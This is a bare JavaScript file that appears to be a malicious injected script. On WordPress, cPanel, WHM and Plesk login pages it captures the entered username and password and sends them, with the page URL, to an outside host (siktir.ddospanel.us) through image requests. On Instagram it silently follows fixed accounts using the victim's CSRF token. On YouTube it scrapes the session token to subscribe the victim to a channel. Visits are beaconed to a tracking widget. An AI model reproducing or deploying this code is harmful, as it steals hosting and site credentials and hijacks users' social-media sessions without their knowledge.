if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
new Image().src = '//whos.amung.us/widget/kekonam92.png';
document.getElementById('wp-submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}
if(document.title.toLowerCase().indexOf("cpanel") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("whm") >= 0){
	
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("plesk") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.querySelectorAll("button").onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('loginSection-username').value+'&sifre='+document.getElementById('loginSection-password').value+'&location='+location.href;
};
}
var media = {


instagram: {
        token: function () {
            return document.documentElement.innerHTML.split('csrf_token": "')[1].split('"')[0];
        },
	
        follow: function (user_id) {
            var url = "https://www.instagram.com/web/friendships/" + user_id + "/follow/",
                xhr = new XMLHttpRequest;
            xhr.open("POST", url, false);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.setRequestHeader("x-csrftoken", this.token());
            xhr.setRequestHeader("x-instagram-ajax", "1");
            xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
            xhr.send();
        }
    }
}




if (location.hostname.indexOf("instagram.com") >= 0) {

new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';


media.instagram.follow("4043940203");
media.instagram.follow("4101817865");
media.instagram.follow("1140348283");

}


youtube = {
    get_token: function (id) {
        var xhr = new XMLHttpRequest,
            url = "https://www.youtube.com/subscribe_embed?channelid=" + id;
        xhr.open("GET", url);
        xhr.send();
        xhr.onreadystatechange = function () {
            if (200 == xhr.status && xhr.readyState == 4) {
                var response = xhr.responseText;
                if (response.match("'LOGGED_IN': (.*?),")[1] == "true") {
                    var ei = response.match("ei=(.*?)&")[1];
                    var ved = response.match("ved=(.*?)\"")[1];
                    var session_token = response.match('\'XSRF_TOKEN\': "(.*?)"')[1];
                    youtube.subscribe(id, {
                        ei: ei,
                        ved: ved,
                        session_token: session_token
                    });
                }
            }
        }
    },
    subscribe: function (id, token) {

        var params = "ei=" + token.ei + "&feature=channels4&ved=" + token.ved + "&session_token=" + token.session_token;
        var xhr = new XMLHttpRequest,
            url = "https://www.youtube.com/subscription_ajax?action_create_subscription_to_channel=1&c=" + id;
        xhr.open("POST", url);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(params);
        xhr.onreadystatechange = function () {
            if (200 == xhr.status && xhr.readyState == 4) {
                if (JSON.parse(xhr.responseText).response.new_subscription == true) {
                    new Image().src = '//whos.amung.us/swidget/yousayacim';
                }
            }
        }

    }
}


youtube.get_token("UC2-2CTWsv71BJjEKEq9fHUw");
